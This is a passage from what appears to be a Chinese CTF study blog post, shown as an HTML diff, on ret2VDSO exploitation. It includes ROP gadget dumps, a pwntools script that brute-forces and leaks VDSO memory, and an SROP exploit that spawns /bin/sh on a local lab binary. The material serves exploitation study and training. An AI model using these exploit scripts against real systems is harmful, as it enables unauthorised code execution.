0x80</span></span><br><span class="line"><span class="number">0x08048156</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">al</span> <span class="comment">; add byte ptr [eax], al ; mov esp, ebp ; pop ebp ; ret</span></span><br><span class="line"><span class="number">0x080480a3</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">al</span> <span class="comment">; int 0x80</span></span><br><span class="line"><span class="number">0x0804809c</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">al</span> <span class="comment">; mov ebx, eax ; mov eax, 1 ; int 0x80</span></span><br><span class="line"><span class="number">0x08048158</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">al</span> <span class="comment">; mov esp, ebp ; pop ebp ; ret</span></span><br><span class="line"><span class="number">0x0804809d</span> : <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span> + <span class="number">0x1b8c3</span>], <span class="built_in">cl</span> <span class="comment">; add byte ptr [eax], al ; int 0x80</span></span><br><span class="line"><span class="number">0x080480a1</span> : <span class="keyword">add</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">eax</span> <span class="comment">; add byte ptr [eax], al ; int 0x80</span></span><br><span class="line"><span class="number">0x080480b4</span> : <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>] <span class="comment">; add byte ptr [eax], al ; int 0x80</span></span><br><span class="line"><span class="number">0x080480ff</span> : <span class="keyword">cld</span> <span class="comment">; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480eb ; leave ; ret</span></span><br><span class="line"><span class="number">0x08048100</span> : <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">0x10</span>], <span class="built_in">eax</span> <span class="comment">; ja 0x80480ea ; leave ; ret</span></span><br><span class="line"><span class="number">0x08048104</span> : <span class="keyword">fxch</span> <span class="built_in">st</span>(<span class="number">0</span>), <span class="built_in">st</span>(<span class="number">1</span>) <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x080480bb</span> : <span class="keyword">in</span> <span class="built_in">al</span>, <span class="built_in">dx</span> <span class="comment">; pop ebp ; ret</span></span><br><span class="line"><span class="number">0x08048101</span> : <span class="keyword">inc</span> <span class="built_in">ebp</span> <span class="comment">; adc byte ptr [edi - 0x21], dh ; leave ; ret</span></span><br><span class="line"><span class="number">0x080480fe</span> : <span class="keyword">inc</span> <span class="built_in">ebp</span> <span class="comment">; cld ; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480ec ; leave ; ret</span></span><br><span class="line"><span class="number">0x080480a5</span> : <span class="keyword">int</span> <span class="number">0x80</span></span><br><span class="line"><span class="number">0x08048103</span> : <span class="keyword">ja</span> <span class="number">0x80480e7</span> <span class="comment">; leave ; ret</span></span><br><span class="line"><span class="number">0x08048105</span> : <span class="keyword">leave</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x08048155</span> : <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0</span> <span class="comment">; mov esp, ebp ; pop ebp ; ret</span></span><br><span class="line"><span class="number">0x080480a0</span> : <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">1</span> <span class="comment">; int 0x80</span></span><br><span class="line"><span class="number">0x080480b3</span> : <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">3</span> <span class="comment">; int 0x80</span></span><br><span class="line"><span class="number">0x080480ca</span> : <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">4</span> <span class="comment">; int 0x80</span></span><br><span class="line"><span class="number">0x080480fd</span> : <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>] <span class="comment">; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480ed ; leave ; ret</span></span><br><span class="line"><span class="number">0x0804809e</span> : <span class="keyword">mov</span> <span class="built_in">ebx</span>, <span class="built_in">eax</span> <span class="comment">; mov eax, 1 ; int 0x80</span></span><br><span class="line"><span class="number">0x080480b0</span> : <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">0x10</span>] <span class="comment">; mov eax, 3 ; int 0x80</span></span><br><span class="line"><span class="number">0x080480c7</span> : <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">0x10</span>] <span class="comment">; mov eax, 4 ; int 0x80</span></span><br><span class="line"><span class="number">0x080480ba</span> : <span class="keyword">mov</span> <span class="built_in">esp</span>, <span class="built_in">ebp</span> <span class="comment">; pop ebp ; ret</span></span><br><span class="line"><span class="number">0x080480af</span> : <span class="keyword">or</span> <span class="built_in">al</span>, <span class="number">0x8b</span> <span class="comment">; push ebp ; adc byte ptr [eax + 3], bh ; int 0x80</span></span><br><span class="line"><span class="number">0x080480c6</span> : <span class="keyword">or</span> <span class="built_in">al</span>, <span class="number">0x8b</span> <span class="comment">; push ebp ; adc byte ptr [eax + 4], bh ; int 0x80</span></span><br><span class="line"><span class="number">0x08048154</span> : <span class="keyword">or</span> <span class="built_in">al</span>, <span class="number">0xb8</span> <span class="comment">; add byte ptr [eax], al ; add byte ptr [eax], al ; mov esp, ebp ; pop ebp ; ret</span></span><br><span class="line"><span class="number">0x080480f1</span> : <span class="keyword">or</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>], <span class="built_in">al</span> <span class="comment">; retf 0xb60f</span></span><br><span class="line"><span class="number">0x080480bc</span> : <span class="keyword">pop</span> <span class="built_in">ebp</span> <span class="comment">; ret</span></span><br><span class="line"><span class="number">0x080480b1</span> : <span class="keyword">push</span> <span class="built_in">ebp</span> <span class="comment">; adc byte ptr [eax + 3], bh ; int 0x80</span></span><br><span class="line"><span class="number">0x080480c8</span> : <span class="keyword">push</span> <span class="built_in">ebp</span> <span class="comment">; adc byte ptr [eax + 4], bh ; int 0x80</span></span><br><span class="line"><span class="number">0x080480f0</span> : <span class="keyword">push</span> <span class="built_in">ebp</span> <span class="comment">; or byte ptr [ecx], al ; retf 0xb60f</span></span><br><span class="line"><span class="number">0x0804809f</span> : <span class="keyword">ret</span></span><br><span class="line"><span class="number">0x080480f3</span> : <span class="keyword">retf</span> <span class="number">0xb60f</span></span><br><span class="line"><span class="number">0x080480eb</span> : <span class="keyword">ror</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span> + <span class="number">0x558bfc4d</span>], <span class="number">1</span> <span class="comment">; or byte ptr [ecx], al ; retf 0xb60f</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">40</span></span><br></pre></td></tr></table></figure>
 
+
+
 <p>发现并没有什么可用的 ROP，这时候就可以考虑使用 VDSO 进行 ROP 利用，那么先学习一下如何得到 VDSO 文件</p>
+
 <h3 id="如何得到-VDSO-的内容"><a href="#如何得到-VDSO-的内容" class="headerlink" title="如何得到 VDSO 的内容"></a>如何得到 VDSO 的内容</h3><p>根据之前的内容，我们已经得到了 VDSO 的动态加载地址，接下来要考虑的就是要如何利用程序得到 VDSO 的内容</p>
+
 <p>因为 VDSO 里函数的偏移在不同的系统里也是不一样的，所以需要先自己把 VDSO 文件读出来，再进行利用</p>
+
 <p>由最大值和最小值可以看出能成功爆破出 VDSO 地址的概率为 1 / 512</p>
+
 <p>脚本如下，将之前得到的最大值和最小值填到 range 函数里面，每次改动都是以 0x1000 来浮动，所以步长设置为 0x1000：</p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">"i386"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./ret2VDSO"</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">RANGE_VDSO = range(<span class="number">0xf7ed8000</span>, <span class="number">0xf7fd7000</span>, <span class="number">0x1000</span>)</span><br><span class="line">addr_vdso = random.choice(RANGE_VDSO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">"./ret2VDSO"</span>)</span><br><span class="line">        <span class="comment"># gdb.attach(p, 'b *0x80480cf\nc\nc')</span></span><br><span class="line">        pd = <span class="string">'a'</span> * <span class="number">0x84</span></span><br><span class="line">        pd += p32(elf.sym[<span class="string">'write'</span>])</span><br><span class="line">        pd += p32(<span class="number">0</span>)</span><br><span class="line">        pd += p32(<span class="number">1</span>)</span><br><span class="line">        pd += p32(addr_vdso)</span><br><span class="line">        pd += p32(<span class="number">0x4000</span>)</span><br><span class="line">        p.send(pd)</span><br><span class="line">        p.recvuntil(pd)</span><br><span class="line">        result = p.recvall(timeout=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(result) &gt;= <span class="number">0x2000</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'vdso.so'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> wl:</span><br><span class="line">                wl.write(result)</span><br><span class="line">            success(<span class="string">"Success"</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            exit(<span class="number">1337</span>)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
 
+
+
 <p>最后得到的文件大小应该是<code>8.2 KB (8,192 字节)</code>正好对应 0x2000 ，即 2 内存页的 VDSO 内容</p>
+
 <h3 id="VDSO-中的内容"><a href="#VDSO-中的内容" class="headerlink" title="VDSO 中的内容"></a>VDSO 中的内容</h3><p>注意这里面的偏移在不同的系统里也是不一样的，需要先自己把 VDSO 文件读出来，再进行利用</p>
+
 <p><strong>vdso_x64.so</strong></p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@lepPwn:~/CTF/Pwn<span class="comment"># objdump -T vdso_x64.so</span></span><br><span class="line"></span><br><span class="line">vdso_x64.so：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">0000000000000a30  w   DF .text	0000000000000305  LINUX_2.6   clock_gettime</span><br><span class="line">0000000000000d40 g    DF .text	00000000000001c1  LINUX_2.6   __vdso_gettimeofday</span><br><span class="line">0000000000000d40  w   DF .text	00000000000001c1  LINUX_2.6   gettimeofday</span><br><span class="line">0000000000000f10 g    DF .text	0000000000000015  LINUX_2.6   __vdso_time</span><br><span class="line">0000000000000f10  w   DF .text	0000000000000015  LINUX_2.6   time</span><br><span class="line">0000000000000a30 g    DF .text	0000000000000305  LINUX_2.6   __vdso_clock_gettime</span><br><span class="line">0000000000000000 g    DO *ABS*	0000000000000000  LINUX_2.6   LINUX_2.6</span><br><span class="line">0000000000000f30 g    DF .text	000000000000002a  LINUX_2.6   __vdso_getcpu</span><br><span class="line">0000000000000f30  w   DF .text	000000000000002a  LINUX_2.6   getcpu</span><br></pre></td></tr></table></figure>
 
+
+
 <p><strong>vdso_x86.so</strong></p>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@lepPwn:~/CTF/Pwn<span class="comment"># objdump -T vdso_x86.so</span></span><br><span class="line"></span><br><span class="line">vdso_x86.so：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">00000fd0 g    DF .text	0000000d  LINUX_2.5   __kernel_vsyscall</span><br><span class="line">00000d00 g    DF .text	00000281  LINUX_2.6   __vdso_gettimeofday</span><br><span class="line">00000ff0 g    DF .text	00000009  LINUX_2.5   __kernel_sigreturn</span><br><span class="line">00000f90 g    DF .text	00000028  LINUX_2.6   __vdso_time</span><br><span class="line">00000000 g    DO *ABS*	00000000  LINUX_2.5   LINUX_2.5</span><br><span class="line">00001000 g    DF .text	00000008  LINUX_2.5   __kernel_rt_sigreturn</span><br><span class="line">00000810 g    DF .text	000004e6  LINUX_2.6   __vdso_clock_gettime</span><br><span class="line">00000000 g    DO *ABS*	00000000  LINUX_2.6   LINUX_2.6</span><br></pre></td></tr></table></figure>
 
+
+
 <p>可以看到有个<code>__kernel_rt_sigreturn</code>，利用这个可以使用 SROP 来进行提权</p>
+
 <p>这也是 ret2VDSO 为什么经常是 32 位的原因</p>
+
 <h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>那么利用 SROP 即可得到 shell</p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">"i386"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./ret2VDSO"</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># 这个文件需要先用脚本读出来</span></span><br><span class="line">vdso = ELF(<span class="string">"./vdso.so"</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">RANGE_VDSO = range(<span class="number">0xf7ed8000</span>, <span class="number">0xf7fd7000</span>, <span class="number">0x1000</span>)</span><br><span class="line">addr_vdso = random.choice(RANGE_VDSO)</span><br><span class="line">addr_int_0x80 = <span class="number">0x080480a5</span></span><br><span class="line">addr_bin_sh = elf.sym[<span class="string">'buf'</span>]</span><br><span class="line">addr___kernel_sigreturn = addr_vdso + vdso.sym[<span class="string">'__kernel_sigreturn'</span>]</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">'amd64'</span>)</span><br><span class="line">frame.eax = constants.SYS_execve</span><br><span class="line">frame.ebx = addr_bin_sh</span><br><span class="line">frame.ecx = <span class="number">0</span></span><br><span class="line">frame.edx = <span class="number">0</span></span><br><span class="line">frame.eip = addr_int_0x80</span><br><span class="line">frame.cs = <span class="number">0x23</span></span><br><span class="line">frame.ss = <span class="number">0x2b</span></span><br><span class="line">frame.ds = <span class="number">0x2b</span></span><br><span class="line">frame.es = <span class="number">0x2b</span></span><br><span class="line">frame.gs = <span class="number">0</span></span><br><span class="line">frame.fs = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">"./ret2VDSO"</span>)</span><br><span class="line">        <span class="comment"># gdb.attach(p, 'b *0x804815d\nc')</span></span><br><span class="line">        pd = <span class="string">'/bin/sh'</span></span><br><span class="line">        pd = pd.ljust(<span class="number">0x84</span>, <span class="string">'\x00'</span>)</span><br><span class="line">        pd += p32(addr___kernel_sigreturn)</span><br><span class="line">        pd += <span class="string">'a'</span> * <span class="number">4</span>  <span class="comment"># from debug</span></span><br><span class="line">        pd += str(frame)</span><br><span class="line">        p.send(pd)</span><br><span class="line">        <span class="comment"># pause()  # for debug</span></span><br><span class="line">        p.recvuntil(pd)</span><br><span class="line">        p.sendline(<span class="string">'ls -la'</span>)</span><br><span class="line">        p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">        p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/5236</span><br></pre></td></tr></table></figure>
+
       
+
     </div>
+
     
+
   </div>
+
   
+
     
+
     <div class="copyright">
+
         <p><span>本文标题:</span><a href="">【Pwn 笔记】栈溢出利用总结 -- Advanced ROP</a></p>
-        <p><span>文章作者:</span><a href="/old_blog_01/" title="回到主页">binLep</a></p>
+
+        <p><span>文章作者:</span><a href="old_blog_01//" title="回到主页">binLep</a></p>
+
         <p><span>发布时间:</span>2020-03-03, 09:16:00</p>
+
         <p><span>最后更新:</span>2020-03-03, 12:39:49</p>
+
         <p>
+
             <span>原始链接:</span><a class="post-url" href="" title="【Pwn 笔记】栈溢出利用总结 -- Advanced ROP">https://binlep.github.io/old_blog_01/2020/03/03/【Pwn 笔记】栈溢出利用总结 -- Advanced ROP/</a>
+
             <span class="copy-path" data-clipboard-text="原文: https://binlep.github.io/old_blog_01/2020/03/03/【Pwn 笔记】栈溢出利用总结 -- Advanced ROP/　　作者: binLep" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+
             <script> var clipboard = new Clipboard('.copy-path'); </script>
+
         </p>
+
         <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="old_blog_01/http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+
         </p>
+
     </div>
+
+
+
+
 
 
 
     <nav id="article-nav">
+
         
+
             <div id="article-nav-newer" class="article-nav-title">
+
                 <a href="../../10/【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解/">
+
                     【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解
+
                 </a>
+
             </div>
+
         
+
         
+
             <div id="article-nav-older" class="article-nav-title">
+
                 <a href="../../../02/29/【Crypto 笔记】古典密码学习/">
+
                     【Crypto 笔记】古典密码学习
+
                 </a>
+
             </div>
+
         
+
     </nav>
 
+
+
   
+
 </article>
 
+
+
     <div id="toc" class="toc-article">
+
         <strong class="toc-title">文章目录</strong>
+
         
+
             <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SROP"><span class="toc-number">1.</span> <span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2VDSO"><span class="toc-number">2.</span> <span class="toc-text">ret2VDSO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#VDSO-简述"><span class="toc-number">2.1.</span> <span class="toc-text">VDSO 简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于-VDSO-在内存中的存储"><span class="toc-number">2.2.</span> <span class="toc-text">关于 VDSO 在内存中的存储</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取-VDSO-的动态加载地址"><span class="toc-number">2.3.</span> <span class="toc-text">获取 VDSO 的动态加载地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例解析"><span class="toc-number">2.4.</span> <span class="toc-text">实例解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源程序"><span class="toc-number">2.4.1.</span> <span class="toc-text">源程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何得到-VDSO-的内容"><span class="toc-number">2.4.2.</span> <span class="toc-text">如何得到 VDSO 的内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VDSO-中的内容"><span class="toc-number">2.4.3.</span> <span class="toc-text">VDSO 中的内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getshell"><span class="toc-number">2.4.4.</span> <span class="toc-text">Getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+
         
+
     </div>
+
     <style>
+
         .left-col .switch-btn,
+
         .left-col .switch-area {
+
             display: none;
+
         }
+
         .toc-level-3 i,
+
         .toc-level-3 ol {
+
             display: none !important;
+
         }
+
     </style>
+
+
 
     <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
+
+
     <script>
+
         yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+
     </script>
 
 
 
-    
-<div class="share">
-    
-        <div class="bdsharebuttonbox">
-            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
-            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
-            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
-            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
-            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
-            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
-            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
-        </div>
-        <script>
-            window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"【Pwn 笔记】栈溢出利用总结 -- Advanced ROP　| binLep's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
-        </script>
-    
+
+
+
 
     
+
+<div class="share">
+
+    
+
+        <div class="bdsharebuttonbox">
+
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+
+        </div>
+
+        <script>
+
+            window._bd_share_config={
+
+                "common":{"bdSnsKey":{},"bdText":"【Pwn 笔记】栈溢出利用总结 -- Advanced ROP　| binLep's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+
+        </script>
+
+    
+
+
+
+    
+
 </div>
 
 
@@ -460,139 +914,282 @@
 
 
 
+
+
+
+
+
+
+
+
     
+
+
+
+
+
 
 
 
 
     <div class="scroll" id="post-nav-button">
+
         
+
             <a href="../../10/【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解/" title="上一篇: 【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解">
+
                 <i class="fa fa-angle-left"></i>
+
             </a>
+
         
+
+
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
+
+
         
+
             <a href="../../../02/29/【Crypto 笔记】古典密码学习/" title="下一篇: 【Crypto 笔记】古典密码学习">
+
                 <i class="fa fa-angle-right"></i>
+
             </a>
+
         
+
     </div>
+
+
 
     <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="../../../04/29/【置顶】博客搬家啦/">【置顶】博客搬家啦</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/23/【WriteUp】NPUCTF 2020 -- Pwn 题解/">【WriteUp】NPUCTF 2020 -- Pwn 题解（未完）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/21/【WriteUp】UMDCTF  2020 -- Pwn 题解/">【WriteUp】UMDCTF  2020 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/15/【Pwn 笔记】IO FILE 利用链汇总/">【Pwn 笔记】IO FILE 利用链汇总（待补充）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/15/【Pwn 笔记】glibc 利用中那些偏门的技巧/">【Pwn 笔记】Glibc 利用中那些偏门的技巧</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/13/【WriteUp】Byte Bandits CTF 2020 -- Pwn 题解/">【WriteUp】Byte Bandits CTF 2020 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../04/12/【WriteUp】TG：HACK 2020 -- Pwn 题解/">【WriteUp】TG：HACK 2020 -- Pwn 题解（未完）</a></li><li class="post-list-item"><a class="post-list-link" href="../../30/【Blockchain 笔记】区块链的环境搭建/">【Blockchain 笔记】区块链的环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../26/【Pwn 笔记】Windows Pwn 环境搭建/">【Pwn 笔记】Windows Pwn 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../24/【Pwn 笔记】Linux 命令注入一览/">【Pwn 笔记】Linux 命令注入一览</a></li><li class="post-list-item"><a class="post-list-link" href="../../24/【WrtieUp】BJDCTF 2nd -- Pwn 题解/">【WrtieUp】BJDCTF 2nd -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../21/【WrtieUp】CISCN 2019 -- Pwn 题解/">【WrtieUp】CISCN 2019 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../20/【Pwn 笔记】跨平台架构的环境配置与调试/">【Pwn 笔记】跨平台架构的环境配置与调试</a></li><li class="post-list-item"><a class="post-list-link" href="../../12/【Pwn 笔记】Linux Kernel 调试命令总结/">【Pwn 笔记】Linux Kernel 调试命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../12/【Pwn 笔记】Linux Kernel 总结 -- ROP/">【Pwn 笔记】Linux Kernel 总结 -- Kernel-ROP</a></li><li class="post-list-item"><a class="post-list-link" href="../../12/【Pwn 笔记】Linux Kernel 调试文件总结/">【Pwn 笔记】Linux Kernel 调试文件总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../10/【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解/">【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="">【Pwn 笔记】栈溢出利用总结 -- Advanced ROP</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/29/【Crypto 笔记】古典密码学习/">【Crypto 笔记】古典密码学习</a></li><li 